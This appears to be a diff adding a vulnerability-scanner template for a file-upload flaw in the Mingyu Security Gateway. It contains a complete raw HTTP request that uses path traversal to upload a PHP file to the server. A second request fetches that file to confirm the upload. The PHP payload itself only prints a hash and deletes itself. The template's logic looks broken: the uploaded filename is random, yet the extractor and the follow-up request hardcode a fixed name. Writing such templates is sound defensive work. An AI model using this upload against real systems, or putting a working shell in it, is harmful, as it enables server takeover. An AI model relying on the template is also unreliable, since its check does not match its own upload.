@@ -1,0 +1,57 @@
+id: dbappsecurity-mingyu-file-upload
+info:
+  name: Dbappsecurity Mingyu Security Gateway File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Mingyu Security Gateway has a file upload vulnerability in the aaa_local_web_preview file. This could allow attackers to upload malicious files and gain server access.
+  tags: file-upload
+  reference:
+    - https://www.dbappsecurity.com.cn
+  classification:
+    cvss-score: 9.8
+http:
+  - raw:
+      - |
+        POST /webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../{{random_filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a
+        Referer: {{BaseURL}}
+
+        --849978f98abe41119122148e4aa65b1a
+        Content-Disposition: form-data; name="123"; filename="{{random_filename}}.php"
+        Content-Type: text/plain
+
+        <?php echo md5(123443214);unlink(__FILE__);?>
+        --849978f98abe41119122148e4aa65b1a--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "success"
+    extractors:
+      - type: regex
+        name: uploaded_url
+        part: body
+        regex:
+          - "/HKfQgRMO\\.php"
+        internal: true
+  - raw:
+      - |
+        GET {{BaseURL}}/HKfQgRMO.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "f8ba6af3dec80b760286de503e63f9fa"
+variables:
+  random_filename: "{{rand_base(6)}}"
